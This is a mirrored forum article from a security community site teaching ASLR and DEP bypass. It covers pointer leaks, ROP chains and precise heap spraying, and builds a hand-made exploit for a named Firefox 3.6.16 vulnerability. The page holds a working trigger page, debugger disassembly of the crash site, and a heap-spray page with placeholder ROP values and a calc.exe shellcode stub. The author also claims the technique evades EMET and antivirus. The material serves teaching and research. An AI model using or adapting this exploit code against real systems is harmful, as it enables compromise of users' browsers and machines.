<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/content.php?r=92-ASLR-DEP-bypassing-techniques by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:48:59 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->

    <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="index.html" id="e_vb_meta_bburl" name="vb_meta_bburl"/>
<base/><!--[if IE]></base><![endif]-->
<meta content="vBulletin 4.2.1" name="generator"/>
<meta content="IE=9" http-equiv="X-UA-Compatible"/>

	<link href="favicon.ico" rel="Shortcut Icon" type="image/x-icon"/>


		<meta content="ASLR DEP bypassing techniques" name="keywords"/>
		<meta content="ASLR DEP bypassing techniques" name="description"/>



	<meta content="170793809601191" property="fb:app_id"/>
<meta content="Garage4hackers Forum" property="og:site_name"/>
<meta content="ASLR DEP bypassing techniques" property="og:description"/>
<meta content="content43c2.html?r=92-ASLR-DEP-bypassing-techniques" property="og:url"/>
<meta content="article" property="og:type"/>




	
		<script src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js" type="text/javascript"></script>
	

<script type="text/javascript">
<!--
	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
	{
		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
		var yuipath = 'clientscript/yui';
		var yuicombopath = '';
		var remoteyui = false;
	}
	else	// Load Rest of YUI remotely (where possible)
	{
		var yuipath = 'http://yui.yahooapis.com/2.9.0/build';
		var yuicombopath = 'http://yui.yahooapis.com/combo';
		var remoteyui = true;
		if (!yuicombopath)
		{
			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
		}
	}
	var SESSIONURL = "";
	var SECURITYTOKEN = "guest";
	var IMGDIR_MISC = "images/misc";
	var IMGDIR_BUTTON = "images/buttons";
	var vb_disable_ajax = parseInt("0", 10);
	var SIMPLEVERSION = "421";
	var BBURL = "index.html";
	var LOGGEDIN = 0 > 0 ? true : false;
	var THIS_SCRIPT = "vbcms";
	var RELPATH = "content43c2.html?r=92-ASLR-DEP-bypassing-techniques";
	var PATHS = {
		forum : "",
		cms   : "",
		blog  : ""
	};
	var AJAXBASEURL = "index.html";
// -->
</script>
<script src="clientscript/vbulletin-core6719.js?v=421" type="text/javascript"></script>



	<link href="external9476.php?type=RSS2" rel="alternate" title="Garage4hackers Forum RSS Feed" type="application/rss+xml"/>
	



	<link href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," rel="stylesheet" type="text/css"/>

	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
	<![endif]-->


    
        <link href="externalbc09.php?do=rss&amp;type=newcontent&amp;sectionid=1&amp;days=120&amp;count=10" rel="alternate" title="Garage4hackers Forum - CMS RSS Feed" type="application/rss+xml"/>
    
    <title>Garage4hackers Forum - ASLR DEP bypassing techniques</title>
	
		<link href="css6862.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=widgets.css,vbcms.css,postbit-lite.css,postlist.css,lightbox.css,overlay.css,tagcloud.css," rel="stylesheet" type="text/css"/>
	
    <!--[if lt IE 8]>
        <link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=vbcms-ie.css,postbit-lite-ie.css,postlist-ie.css" />
    <![endif]-->
    <!--[if lt IE 7]>
	<script type="text/javascript">
		window.LESS_THAN_IE7 = true;
	</script>
    <![endif]-->
	<script src="clientscript/vbulletin_overlay6719.html?v=421" type="text/javascript"></script>
	<script src="clientscript/vbulletin_cms6719.html?v=421" type="text/javascript"></script>
	<script src="clientscript/vbulletin_ajax_htmlloader6719.js?v=421" type="text/javascript">
    </script>
    <link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>

</head>
<body style="text-align:left">
<div class="above_body"> <!-- closing tag is in template navbar -->
<div class="floatcontainer doc_header" id="header">
	<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
	<div class="toplinks" id="toplinks">
		
			<ul class="nouser">
			
				<li><a href="register.html" rel="nofollow">Register</a></li>
			
				<li><a href="faq.html" rel="help">Help</a></li>
				<li>
			<script src="clientscript/vbulletin_md56719.html?v=421" type="text/javascript"></script>
			<form action="../external.html?link=http://garage4hackers.com/login.php?do=login" id="navbar_loginform" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
				<fieldset class="logindetails" id="logindetails">
					<div>
						<div>
					<input accesskey="u" class="textbox default-value" id="navbar_username" name="vb_login_username" size="10" tabindex="101" type="text" value="User Name"/>
					<input class="textbox" id="navbar_password" name="vb_login_password" size="10" tabindex="102" type="password"/>
					<input class="textbox default-value" id="navbar_password_hint" name="vb_login_password_hint" size="10" style="display:none;" tabindex="102" type="text" value="Password"/>
					<input accesskey="s" class="loginbutton" tabindex="104" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." type="submit" value="Log in"/>
						</div>
					</div>
				</fieldset>
				<div class="remember" id="remember">
					<label for="cb_cookieuser_navbar"><input accesskey="c" class="cb_cookieuser_navbar" id="cb_cookieuser_navbar" name="cookieuser" tabindex="103" type="checkbox" value="1"/> Remember Me?</label>
				</div>

				<input name="s" type="hidden" value=""/>
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="login"/>
				<input name="vb_login_md5password" type="hidden"/>
				<input name="vb_login_md5password_utf" type="hidden"/>
			</form>
			<script type="text/javascript">
			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
			vB_XHTML_Ready.subscribe(function()
			{
			//
				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
			});
			
			function navbar_username_focus(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == 'User Name')
				{
				//
					textbox.value='';
					textbox.style.color='#000000';
				}
			}

			function navbar_username_blur(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == '')
				{
				//
					textbox.value='User Name';
					textbox.style.color='#777777';
				}
			}
			
			function navbar_password_hint(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
				YAHOO.util.Dom.get('navbar_password').focus();
			}

			function navbar_password(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				if (textbox.value == '')
				{
					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
				}
			}
			</script>
				</li>
				
					<li class="hidden" id="fb_headerbox">

	<a href="#" id="fb_loginbtn"><img alt="The Facebook Platform" src="images/misc/facebook_login.gif"/></a>

</li>

				
			</ul>
		
	</div>
	<div class="ad_global_header">
		 
		 
	</div>
	<hr/>
</div>
<div class="navbar" id="navbar">
	<ul class="navtabs floatcontainer" id="navtabs">
		
		
	
		<li id="vbtab_whatsnew">
			<a class="navtab" href="activity.html">What's New?</a>
		</li>
		
		

	
		<li class="selected" id="vbtab_cms">
			<a class="navtab" href="content.html">Articles</a>
		</li>
		
		
			<ul class="floatcontainer">
				
					
						
							<li id=""><a href="content5ee7.html?r=1-home">Home</a></li>
						
					
				
			</ul>
		

	
		<li id="vbtab_forum">
			<a class="navtab" href="forum.html">Forum</a>
		</li>
		
		

	
		<li id="vbtab_blog">
			<a class="navtab" href="blog.html">Blogs</a>
		</li>
		
		

	
		<li id="tab_nja4_357">
			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
		</li>
		
		

	
		<li id="tab_nta0_579">
			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
		</li>
		
		

	
		<li id="tab_nta0_442">
			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
		</li>
		
		

		<li>
            <a class="navtab" href="pages.html">Events and Conferences</a></li>
	</ul>
	
		<div class="globalsearch" id="globalsearch">
			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" class="navbar_search" id="navbar_search" method="post">
				
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="process"/>
				<span class="textboxcontainer"><span><input class="textbox" name="query" tabindex="99" type="text" value=""/></span></span>
				<span class="buttoncontainer"><span><input class="searchbutton" name="submit" onclick="document.getElementById('navbar_search').submit;" src="images/buttons/search.html" tabindex="100" type="image"/></span></span>
			</form>
			<ul class="navbar_advanced_search">
				<li><a accesskey="4" href="search.html">Advanced Search</a></li>
				
			</ul>
		</div>
	
</div>
</div><!-- closing div for above_body -->

<div class="body_wrapper">
<div class="breadcrumb" id="breadcrumb">
	<ul class="floatcontainer">
		<li class="navbithome"><a accesskey="1" href="content.html"><img alt="Home" src="images/misc/navbit-home.png"/></a></li>
		
	<li class="navbit"><a href="content.html">Home</a></li>

	<li class="navbit"><a href="contentc520.html?r=163-exploitation-techniques">Exploitation Techniques</a></li>

		
	<li class="navbit lastnavbit"><span>ASLR DEP bypassing techniques</span></li>

	</ul>
	<hr/>
</div>


<div style="width:728px; margin:0 auto; padding-bottom:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 728;
google_ad_height = 15;
google_ad_format = "728x15_0ads_al_s";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

<div id="ad_global_below_navbar"><script async="" src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- garage1 -->
<ins class="adsbygoogle" data-ad-client="ca-pub-6847984837250662" data-ad-slot="4036513682" style="display:inline-block;width:728px;height:90px"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>


	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" class="notices" id="notices" method="post">
		<input name="do" type="hidden" value="dismissnotice"/>
		<input name="s" type="hidden" value=""/>
		<input name="securitytoken" type="hidden" value="guest"/>
		<input id="dismiss_notice_hidden" name="dismiss_noticeid" type="hidden" value=""/>
		<input name="url" type="hidden" value=""/>
		<ol>
			<li class="restore" id="navbar_notice_2">
	
	
<h2>
The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 


</h2>

<!-- Mirrored from garage4hackers.com/content.php?r=92-ASLR-DEP-bypassing-techniques by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:48:59 GMT -->

</li>
		</ol>
	</form>



<div class="vbcms_content">
<div class="yui-tvb-r3" id="doc3">
	<div id="bd">
		<div id="yui-main">
			<div class="yui-b">
				<div class="yui-gf">
					<div class="yui-u first yui-panel">
						<ul class="list_no_decoration widget_list" id="widgetlist_column1">
<li><script type="text/javascript">
<!--
	var IMGDIR_MISC = "images/misc";
	var vb_disable_ajax = parseInt("0", 10);

        /* Start Sections Widget Configuration */
        vbGlobal_SHOW_ALL_TREE_ELEMENTS_THRESHOLD = parseInt("5");
        /* End Seections Widget Configuration */
// -->
</script>
<script type="text/javascript">
<!--
	document.write('<script type="text/javascript" src="' + yuipath + '/treeview/treeview-min.js"></script>');
	loadVbCss(yuipath + '/treeview/assets/skins/sam/treeview.css');
//-->
</script>
<!-- end treeview css -->

<!-- custom treeview styles defined at template: headinclude -->

<!-- END VB Tree-Menu Implementation of YUI TreeView -->
<div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
			<h3><img alt="" src="images/cms/sections.png"/> Menu</h3>
		</div>
		<div class="cms_widget_content widget_content">
			<div class="vb-tree-menu">
				<ul>
<li><a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers" title="G4H Tutorial and Papers">G4H Tutorial and Papers</a>
</li>
<li><a href="content842d.html?r=4-g4h-tools-and-scripts" title="G4H Tools and Scripts">G4H Tools and Scripts</a>
</li>
<li><a href="content8f5d.html?r=2-garage4hackers-exploits" title="G4H Exploits">G4H Exploits</a>
</li>
<li><a href="content7820.html?r=107-ctf-amp-meet-writeups" title="CTF &amp; Meet Writeups">CTF &amp; Meet Writeups</a>
</li>
<li><a href="content0b4f.html?r=128-google-vulnerabilities" title="Google Hall of Fame">Google Hall of Fame</a>
</li>
<li><a href="contentf20a.html?r=134-teensy" title="Teensy">Teensy</a>
</li>
<li><a href="content93b9.html?r=136-webapp-exploits" title="Bug Bounty Listing">Bug Bounty Listing</a>
</li>
<li><a href="contentdb2e.html?r=151-web-application-security" title="Web Application Security">Web Application Security</a>
</li>
<li><a href="contentc520.html?r=163-exploitation-techniques" title="Exploitation Techniques">Exploitation Techniques</a>
</li>
<li><a href="content90cc.html?r=172-ranchoddas-webcast-recording" title="RWS Webcast Recording">RWS Webcast Recording</a>
</li>
<li><a href="contente989.html?r=179-blogs" title="Blogs">Blogs</a>
</li></ul>
 
			</div>
				<noscript>
					<div class="cms_widget_sectionnav">
						<div class="cms_widget_sectionnav_page">
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers">G4H Tutorial and Papers</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content842d.html?r=4-g4h-tools-and-scripts">G4H Tools and Scripts</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content8f5d.html?r=2-garage4hackers-exploits">G4H Exploits</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content7820.html?r=107-ctf-amp-meet-writeups">CTF &amp; Meet Writeups</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content0b4f.html?r=128-google-vulnerabilities">Google Hall of Fame</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentf20a.html?r=134-teensy">Teensy</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content93b9.html?r=136-webapp-exploits">Bug Bounty Listing</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentdb2e.html?r=151-web-application-security">Web Application Security</a></div>
							
								
									<div class="active_menuitem" style="text-indent:20px">
								
								<a href="contentc520.html?r=163-exploitation-techniques">Exploitation Techniques</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content90cc.html?r=172-ranchoddas-webcast-recording">RWS Webcast Recording</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contente989.html?r=179-blogs">Blogs</a></div>
							
						</div>
					</div>
				</noscript>			
		</div>
	</div>
</div>

<script type="text/javascript">
	initVbTreeMenus(false);
</script></li>
</ul>
					</div>
					<div class="yui-u yui-panel">
						<ul class="list_no_decoration widget_list" id="widgetlist_column2">
<li><!-- styles defined in template: headinclude -->



<div class="article_width" id="article_content">
	<div class="title">
                <h1 class="article_title cms_article_title"><span>ASLR DEP bypassing techniques</span>
                        
		</h1>
	</div>
	<div class="article_author_date_comment_container">
                
		<div class="fullwidth">
			
				<div>
<fb:like action="../external.html?link=http://garage4hackers.com/like" colorscheme="light" font="tahoma" href="content43c2.html?r=92-ASLR-DEP-bypassing-techniques" layout="standard" show_faces="false" width="260"></fb:like></div>
			
			
				<div class="article_username_container">
					by <div class="popupmenu memberaction">
	<a class="username offline popupctrl" href="memberf35f.html?u=61" title='"vinnu" is offline'><strong>"vinnu"</strong></a>
	<ul class="popupbody popuphover memberaction_body">
		<li class="left">
			<a class="siteicon_profile" href="memberf35f.html?u=61">
				View Profile
			</a>
		</li>
		
		<li class="right">
			<a class="siteicon_forum" href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" rel="nofollow">
				View Forum Posts
			</a>
		</li>
		
		
		<li class="left">
			<a class="siteicon_message" href="privatecde6.html?do=newpm&amp;u=61" rel="nofollow">
				Private Message
			</a>
		</li>
		
		
		
		<li class="right">
			<a class="siteicon_blog" href="blogf35f.html?u=61" rel="nofollow">
				View Blog Entries
			</a>
		</li>
		
		
		
		
		
		<li class="right">
			<a class="siteicon_article" href="list3989.html?r=author/61-quot-vinnu-quot" rel="nofollow">
				View Articles
			</a>
		</li>
		

		

		
		
	</ul>
</div>
				</div>
			
                        
                                <div class="article_rating_container">
                                        <div class="popupmenu cmsratingmenu" id="cmsrating">
                                                <h6><a class="popupctrl" href="javascript://" id="cmsrating_current">Rate this article</a></h6>
                                                <form action="../external.html?link=http://garage4hackers.com/content.php?92/rate" id="cms_cmsrate_form" method="post">
                                                        <ul class="popupbody popuphover">
                                                                
                                                                        <li><label for="r5"><span class="rating5 cmsrating right">
                                                                                <input id="r5" name="vote" tabindex="1" type="radio" value="5"/> Excellent
                                                                        </span></label></li>
                                                                        <li><label for="r4"><span class="rating4 cmsrating right">
                                                                                <input id="r4" name="vote" tabindex="1" type="radio" value="4"/> Good
                                                                        </span></label></li>
                                                                        <li><label for="r3"><span class="rating3 cmsrating right">
                                                                                <input id="r3" name="vote" tabindex="1" type="radio" value="3"/> Average
                                                                        </span></label></li>
                                                                        <li><label for="r2"><span class="rating2 cmsrating right">
                                                                                <input id="r2" name="vote" tabindex="1" type="radio" value="2"/> Bad
                                                                        </span></label></li>
                                                                        <li><label for="r1"><span class="rating1 cmsrating right">
                                                                                <input id="r1" name="vote" tabindex="1" type="radio" value="1"/> Terrible
                                                                        </span></label></li>
                                                                        <li class="formsubmit"><input class="button" tabindex="1" type="submit" value="Vote Now"/></li>
                                                                
                                                        </ul>
                                                        <input name="s" type="hidden" value=""/>
                                                        <input name="securitytoken" type="hidden" value="guest"/>
                                                </form>
                                                <script src="clientscript/cms_ajax_rate6719.html?v=421" type="text/javascript"></script>
                                                <script type="text/javascript">
                                                <!--
                                                        var nodeid = 92;
                                                        vB_AJAX_CMSRate_Init('cms_cmsrate_form');
                                                //-->
                                                </script>
                                        </div>
                                </div>
                        
                        <div class="cms_clear"></div>
                        
				<div class="article_username_container">
					
						
							Published on 09-29-2011  10:24 AM
						
					
					
						 
						 
					
					
						 Number of Views: 4787
						 
					
				</div>
			
                       
                        <div class="article_rating_container">
                            	<a href="content43c2.html?r=92-ASLR-DEP-bypassing-techniques#comments" rel="nofollow"><span id="comments_top_count">0</span> <span id="comments_top_text"> Comments</span></a>
				<img alt="Comments" border="0" src="images/misc/comment.png"/>
                        </div>
                       
		</div>
	</div>
    
    <div class="clear"></div>
	<div class="article cms_clear restore postcontainer">In defeating DEP you atleast need some information that will evade the ASLR.<br/>
There are mainly two ways:<br/>
<br/>
1. Any anti ASLR modules gets loaded into the target application. I mean you have the base address of any module at fixed location always even after the system restart.<br/>
<br/>
2. You get a pointer leak from a memory leak/buffer overflow/any zeroday. In this technique you can adjust the offsets to grab the base address of the module whose pointer gets leaked.<br/>
<br/>
Now, you have evaded the ASLR. Now comes the DEP:<br/>
<br/>
DEP Data Execution Prevention mitigates the most of the attacks by denying the code execution from non executable memory, earlier until xp sp2, the stack and heap were executable, but now they no more possess execute attribute.<br/>
<br/>
But there are methods, you have a pointer, so you can either make your shellcode from ROP, rop is a little advanced return to libc attack and is return oriented programming.<br/>
<br/>
The main idea is to execute the necessary instructions nearby the "return" instruction, but for return instruction, you need to control the stack, the top of the stack must have the address of next instruction where you want to land and all these instructions are chosen or discovered from already loaded executable modules and from there executable code pages.<br/>
<br/>
I have discovered most of the rop chains online, but nearly all are the products of certain automatyed scripts, I mean if you want to learn then start doing it manually, otherwise you'll miss the whole technique.<br/>
The most intelligent ROP chains are discovered manually, and are very specific and provide more control in very small execution overhead.<br/>
<br/>
One more thing to remember, most of the rop chains produced by automated scripts, are not suitable for certain type of vulnerabilities, then you might know how to develop one of yours own.<br/>
<br/>
Using the ROP you can either develop whole of your shellcode or just for the purpose of defeating DEP and then landing on the executable marked shellcode.<br/>
<br/>
Remember, the OS has very good randomization of module bases, stack and heap and pointers, but not the pointers to the pointers, in certain places, you can easily find, fixed addresses/pointer to another pointer inside any other module or to any export of any dll.<br/>
<br/>
Such informations help a lot.<br/>
<br/>
the memory leaks also help, e.g.<br/>
<br/>
function alfa(){<br/>
var a1=document.cookie;<br/>
}<br/>
var a=window.setTimeout(alfa,100);<br/>
alert(a.toString(16));<br/>
<br/>
The above leak is little old now, and provides us witha memory address inside mshtml.dll at the address rendered by a.toString(16)-1<br/>
<br/>
.This was a good pointer to pointer, similarly, 0x7ffe360 in this line you can find the base address of ntdll.dll in win7 64 bit<br/>
whereas in all windows 32 bit versions, 7ffe300 has the addressof sysenter and 0x7ffe304 the ret instruction.<br/>
<br/>
But all these are pointer to pointers i.e. **<br/>
whereas to form a shellcode dynamically, we need a direct pointer.<br/>
I think you better know now the pwn2own memory leak by a buffer overflow.<br/>
<br/>
The custom shellcodes manufactured dynamically from memory leaks of pointers, can be simple and provide us with more control, than the other traditional shellcodes developed by msf etc.<br/>
<br/>
The main advantage of custom shellcodes made by pointer leaks are that, you can easily evade the mitigations like, emet (enhanced mitigation toolikit) and other av engines.<br/>
<br/>
Recomendation : Download and install the ~= 4.5 Mb emet from microsoft to secure yourself. It will fail the executaion of most of your traditional shellcodes.<br/>
<br/>
In next posts, we'll discus about certain vulnerabilities and then evade develop the exploit and try to develop the shellcode and rop chains in this thread. Hope you 'll enjoy and will actively take part.<br/>
...to be continued<br/>
<br/>
--------------------------------------------<br/>
In the world of ASLR and DEP remember there is no place for NOP and NOPsled. Only precision matters.<br/>
<br/>
The sprayer must be developed in such a way that it will place your chunks (rop + shellcode) at fixed locations.<br/>
<br/>
The slip of even a single byte is non preferable as it will make our rop to land at wrong addresses. The precision can be achieved by heap manipulation techniques. I'll recommend to study the "Heap Fengshui" by A. Satirov.<br/>
<br/>
By proper allocation of calculated sized heap chunks, we can more precisely place our chunks at same addresses every time.<br/>
<br/>
Let us proceed with the example and in coding. The example vulnerability (mchannel) is affecting Firefox 3.6.16 and its working exploits are already available. But we'll develop the ROP and shellcode manually and hand crafted no need of mona or anything automated as automation misses certain points and makes the things complex and the solutions are not so intelligent and simple. <br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:372px;">&lt;html&gt;
&lt;head&gt;
&lt;script type='text/javascript'&gt;
            var gravityInsightsParams = new Object();
            gravityInsightsParams.type = 'forum';
            gravityInsightsParams.site_guid = 'dfbf0463bd6f291d1e8d5d86e6db82b3';
            gravityInsightsParams.thread_id = 0;
            gravityInsightsParams.post_id = 0;
            gravityInsightsParams.forum_id = 0;
            gravityInsightsParams.user_id = 8;
            gravityInsightsParams.username = 'fb1h2s';
            gravityInsightsParams.post_title = '';
            gravityInsightsParams.thread_title = '';
            gravityInsightsParams.forum_title = '';
            gravityInsightsParams.board = '';
            gravityInsightsParams.pluginversion = '2.1.0';
            gravityInsightsParams.baseversion = '2.1.0';

                document.write(unescape('%3Cscript src=\'http://cdn.insights.gravity.com/moth-min.js\' type=\'text/javascript\'%3E%3C/script%3E'));
                &lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;object id="d" &gt;&lt;/object&gt;
&lt;script&gt;
function ignite()    {
    var e=document.getElementById("d");
    e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
        e.data="";
}
&lt;/script&gt;
&lt;input type=button value="Ignite" onclick="ignite()" /&gt;
&lt;script type="text/javascript"&gt;
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
&lt;/script&gt;
&lt;script type="text/javascript"&gt;
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>In this vulnerability, we can control the ECX register as the place from where EAX register will grab the value can be controlled by a single object instantiation in heap.<br/>
<br/>
var obj = unescape("\x00ఐ"); // will make ECX register to point to at 0x0C100000<br/>
// This is the address that will easily get sprayed and where the first byte of our chunk will be loaded.<br/>
<br/>
<br/>
Note: Remember to rename the CrashReporter.exe from mozilla folder inside ur program files. And attach the debugger to the firefox before exploiting the vulnerability.<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:108px;">6BE14E69   8B08             MOV ECX,DWORD PTR DS:[EAX] ; This is where our above allocation will load 0x0C100000 into
; ECX register
6BE14E6B   BE 02004B80      MOV ESI,804B0002
6BE14E70   56               PUSH ESI
6BE14E71   50               PUSH EAX
6BE14E72   FF51 18          CALL DWORD PTR DS:[ECX+18] ; This is where call will be transferred at address placed at
; 0x0C100018, So we need to frame our rop+shellcode module accordingly.</pre>
</div>Next comes the sprayer and ROP +shellcode. First of all we'll use dummy chunk in place of ROP+shellcode and slowly develop the ROP and shellcode over the dummy chunk. so let us proceed. For countering ASLR i'll use the GrooveUtil.dll &amp; GR469A~1.DLL which comes along with MS office 2007 in GrooveMonitor. These DLLs gets loaded into browsers by default. If default installation of MS OFFICE 2007 is done.<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:372px;">&lt;html&gt;
&lt;head&gt;
&lt;script type='text/javascript'&gt;
            var gravityInsightsParams = new Object();
            gravityInsightsParams.type = 'forum';
            gravityInsightsParams.site_guid = 'dfbf0463bd6f291d1e8d5d86e6db82b3';
            gravityInsightsParams.thread_id = 0;
            gravityInsightsParams.post_id = 0;
            gravityInsightsParams.forum_id = 0;
            gravityInsightsParams.user_id = 8;
            gravityInsightsParams.username = 'fb1h2s';
            gravityInsightsParams.post_title = '';
            gravityInsightsParams.thread_title = '';
            gravityInsightsParams.forum_title = '';
            gravityInsightsParams.board = '';
            gravityInsightsParams.pluginversion = '2.1.0';
            gravityInsightsParams.baseversion = '2.1.0';

                document.write(unescape('%3Cscript src=\'http://cdn.insights.gravity.com/moth-min.js\' type=\'text/javascript\'%3E%3C/script%3E'));
                &lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;object id="d" &gt;&lt;/object&gt;
&lt;script&gt;

function ignite()    {
    var e=document.getElementById("d");
    e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
    
    var vftable = unescape("\x00% u0c10");
    // ROP using GrooveUtil.dll :
    var heap = unescape(
/* ROP : */            "% u0101% u0102"
                    +"% u0103% u0104"
                    +"% u0105% u0106"
                    +"% u0107% u0108"
                    +"% u0109% u010a"
                    +"% u010b% u010c"
                    +"% u010d% u010e"
                    +"% u010f% u0111"
                    +"% u0112% u0113"
                    +"% u0114% u0115"
                    +"% u0116% u0117"
                    +"% u0118% u0119"
                    +"% u011a% u011b"
                    +"% u011c% u011d"
                    +"% u011e% u011f"
                    )
/* Shellcode : */    +unescape("% u9090% u9090"+"% u9090% u9090"
                    +"% uCCCC% uCCCC% uCCCC% uCCCC"
                    +"% uBBBB% uCCCC% uDDDD% uEEEE"
/* command: */        +"% u6163% u636c% u652e% u6578% u0000% ucccc"    // calc.exe
                    );

        var vtable = unescape("% u0c0c% u0c0c");
        while(vtable.length &lt; 0x10000) {vtable += vtable;}
        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
        while (heapblock.length&lt;0x80000) {heapblock += heap+heapblock;}
        var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
        var spray = new Array()
        for (var iter=0;iter&lt;0x100;iter++){
           spray[iter] = finalspray+heap;
        }
    e.data="";
}
&lt;/script&gt;
&lt;input type=button value="Ignite" onclick="ignite()" /&gt;
&lt;script type="text/javascript"&gt;
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
&lt;/script&gt;
&lt;script type="text/javascript"&gt;
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>Note : In code I've to place a blank space between "%" and "u" as unicode support is converting the blocks into respective characters, remember to remove these spaces from all blocks inside unescape blocks. <br/>
<br/>
